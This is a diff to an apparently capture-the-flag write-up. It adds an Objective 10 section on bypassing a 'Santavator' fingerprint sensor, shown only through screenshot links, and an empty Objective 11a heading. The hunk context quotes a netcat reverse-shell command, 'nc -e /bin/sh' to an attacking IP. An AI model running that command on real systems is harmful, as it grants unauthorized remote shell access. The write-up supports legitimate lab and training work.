@@ -494,6 +494,17 @@ nc -e /bin/sh [attacking ip] 4444
 
 Answer: "Tanta Kringle"
 
+## Objective 10: Defeat Fingerprint Sensor
+
+Bypass the Santavator fingerprint sensor. Enter Santa's office without Santa's fingerprint.
+
+![](screenshots/objective-10-completed.jpg)
+
+![](screenshots/remove-besanta-condition.jpg)
+
+## Objective 11a:
+
+
 
 ---
 
